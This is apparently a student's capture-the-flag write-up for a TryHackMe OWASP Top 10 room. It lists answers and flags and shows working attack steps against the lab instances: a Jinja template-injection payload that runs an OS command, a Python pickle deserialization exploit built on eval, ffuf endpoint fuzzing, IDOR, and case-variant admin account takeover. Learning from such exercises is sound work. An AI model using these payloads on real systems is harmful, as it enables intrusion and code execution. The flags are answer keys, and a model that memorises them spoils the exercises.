Proof: https://tryhackme.com/dashboard?badge=srinathss052007:owasp-10

# IAAA Failures(1/3)

### What is IAAA?

**What does IAAA stand for?**

`Identity, Authentication, Authorisation, Accountability`

### A01: Broken Access Control

1)  **If you don't get access to more roles but can view the data of another users, what type of privilege escalation is this?**
 
     Answer: `Horizontal`

2) **What is the note you found when viewing the user's account who had more than $ 1 million?**

     Flag: `THM{Found.the.Millionare!}`

**Writeup:** 

The site is vulnerable to IDOR vulnerability by changing the id from 5 to 7 gives access to other's profile were the flag is hidden.

<img width="880" height="706" alt="Screenshot 2026-03-20 105227" src="https://github.com/user-attachments/assets/ea86af62-e9f4-4210-ac1e-14a816a5f6b9" />

### AS02: Security Misconfigurations

Challenge Link(Instance): `http://10.49.154.138:5002`

<img width="1578" height="418" alt="image" src="https://github.com/user-attachments/assets/7cfa14fd-a796-45bc-8198-5b2b6265096c" />

**Writeup:**

Directory bruteforcing `/api` endpoints reveals few other directories. In `/api/user/admin` the flag can be retrieved.

<img width="858" height="438" alt="image" src="https://github.com/user-attachments/assets/6b3d0035-9390-4001-b44f-59b30dab9519" />


<img width="702" height="289" alt="image" src="https://github.com/user-attachments/assets/6a38d8a8-5b96-4ad8-8f7a-555f1d30e6a2" />


Flag: `THM{V3RB0S3_3RR0R_L34K}`

## AS03: Software Supply Chain Failures

Here they have given one python file and the challenge link.

Challenge Link(Instance): `http://10.49.154.138:5003`

<img width="1763" height="774" alt="image" src="https://github.com/user-attachments/assets/21ce970e-b56c-422c-9bf2-f5744b7e4893" />

We have two endpoints to hit here,  one is `/api/health` and `/api/process`.

`/api/health` - Doesn't seem interesting

Let’s hit `/api/process`. Make sure to include the `Content-Type: application/json` header, since it’s a RESTful API that works only with JSON. Also, it’s a `POST` request, so it requires a parameter which is `data`.

<img width="1496" height="547" alt="image" src="https://github.com/user-attachments/assets/0f50d58e-b9fc-48c9-8ce4-41eb06e811c2" />

So we need to find the value for the data parameter, Lets anaylse the python code for any leaks.

<img width="688" height="443" alt="image" src="https://github.com/user-attachments/assets/fafeffbb-13d7-45da-8448-29aa2aff07a7" />


```
if data == 'debug': # Value Leaked Here
            return jsonify(debug_info())
```

So our value is `debug`, which reveals the flag.

<img width="1514" height="615" alt="image" src="https://github.com/user-attachments/assets/45f3eb46-cf5e-4bd6-b6ed-bc66e325c146" />


Flag: `THM{SUPPLY_CH41N_VULN3R4B1L1TY}`

## AS04: Cryptographic Failures

Challenge Link: `http://10.49.154.138:5004/`

Were we can see a Encrypted text in the index page 

<img width="1691" height="526" alt="image" src="https://github.com/user-attachments/assets/38a993b7-7cd6-4fbc-b99f-fcc3612dd85a" />

```
Nzd42HZGgUIUlpILZRv0jeIXp1WtCErwR+j/w/lnKbmug31opX0BWy+pwK92rkhjwdf94mgHfLtF26X6B3pe2fhHXzIGnnvVruH7683KwvzZ6+QKybFWaedAEtknYkhe
```

Anaylsing the source code we can see a js file called `decrypt.js` which revealed the secret key and algorithm of the encryption

<img width="493" height="233" alt="image" src="https://github.com/user-attachments/assets/a6c0b178-31d4-4736-94bd-536619e73226" />


Algorithm: `AES`

Cipher Mode: `ECB`

Padding: `No Padding`

Key-Size: `128`

Key: `my-secret-key-16`

Now lets decrypt it using decryptors in online like https://www.devglan.com/online-tools/aes-encryption-decryption

Which reveals the flag:

<img width="631" height="826" alt="image" src="https://github.com/user-attachments/assets/b6b1f07a-0b9e-4232-8194-45283cee8781" />

Flag: `THM{CRYPTO_FAILURE_H4RDCOD3D_K3Y}`

## A05: Injection

Writeup: 

Class SSTI Payload: 

```
{{self.__init__.__globals__['__builtins__']['__import__']('os').popen('cat flag.txt').read()}}
```

<img width="1114" height="848" alt="image" src="https://github.com/user-attachments/assets/313a67ee-db91-4f5a-8b85-f36915430f73" />

Flag: ```THM{SSTI_FLAG_OBTAINED}```

## AS06: Insecure Design

Challenge Link: `http://10.49.154.138:5005`

Writeup: 

<img width="1522" height="832" alt="image" src="https://github.com/user-attachments/assets/ad8bccde-0292-4c33-9900-37d69883fe25" />


Hitting `/api/users/admin` this endpoint reveals 

<img width="520" height="197" alt="image" src="https://github.com/user-attachments/assets/e92e2018-4d1d-4b7b-9625-ad3cb5b1061b" />


We can see /api/users/admin gives some data lets try fuzzing the endpoint after /api/ with /admin maybe we can get endpoints like `/api/profile/admin` or `/api/data/admin`

Fuzzing with ffuf: 

Command: 

```
ffuf -u http://10.49.154.138:5005/api/FUZZ/admin -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

<img width="1113" height="526" alt="image" src="https://github.com/user-attachments/assets/dc495733-5c29-4345-857a-4d373d8d3c36" />

We get `/messages` endpoints which reveals the flag:

<img width="831" height="322" alt="image" src="https://github.com/user-attachments/assets/7b9e908e-80c8-4ffe-bfb2-00ca77ff1289" />

Flag: `THM{1NS3CUR3_D35IGN_4SSUMPT10N}`

### A07: Authentication Failures

1) **What is the flag on the admin user's dashboard?**

**Writeup:**
Here we can create duplicate account using the same username `admin` in different cases eg. `aDmiN`

<img width="888" height="821" alt="Screenshot 2026-03-20 105851" src="https://github.com/user-attachments/assets/8e70f2f9-8ec8-47a1-81f0-88eca51fed87" />




Now login with the same username which is Admin account authentication failure.

<img width="914" height="430" alt="image" src="https://github.com/user-attachments/assets/015520e6-82ae-461f-bd73-51c977db02f6" />



**Flag:** 


# A06: Insecure Data Handling(3/3)

Writeup:

We got an challenge website where 3 letters of the xor key is revealed and we need to find the one letter of the key to decrypt the flag

<img width="1495" height="643" alt="image" src="https://github.com/user-attachments/assets/1497e400-98fa-4d0f-947d-ad07c8834f2b" />

So we can bruteforce which burp and find the key.

Setting up the burp intruder and selecting the last character of the key and select bruteforce mode in the intruder 

<img width="1872" height="799" alt="image" src="https://github.com/user-attachments/assets/e5a4a3c4-8755-4c27-b23d-68c689768899" />

Now filter the responses with Length we can see 1 has the highest length lets try `KEY1` .

<img width="1800" height="619" alt="image" src="https://github.com/user-attachments/assets/94c04b53-8461-47f4-86dc-4757b3231043" />

Flag: `THM{WEAK_CRYPTO_FLAG}`

## A07: Software or Data Integrity Failures

**Writeup:**

```
import pickle
import base64

class Malicious:
    def __reduce__(self):
        # Return a tuple: (callable, args)
        # This will execute: open('flag.txt').read()
        return (eval, ("open('flag.txt').read()",))

# Generate and encode the payload
payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print(encoded)
```

O/P: 
```
gASVMwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwXb3BlbignZmxhZy50eHQnKS5yZWFkKCmUhZRSlC4=
```

<img width="1003" height="783" alt="image" src="https://github.com/user-attachments/assets/d33b4b16-38fe-45c3-b745-ef3d0e8e4252" />

Flag: `THM{INSECURE_DESERIALIZATION}`


## A09: Logging and Alerting Failures

1)  It looks like an attacker tried to perform a brute-force attack, what is the IP of the attacker?

203.0.113.45

2) What action did the attacker try to do with the account? List the endpoint the accessed.

/supersecretadminstuff


<img width="1918" height="996" alt="image" src="https://github.com/user-attachments/assets/8d80f01b-5630-4e4f-aa90-61db661c3ed6" />
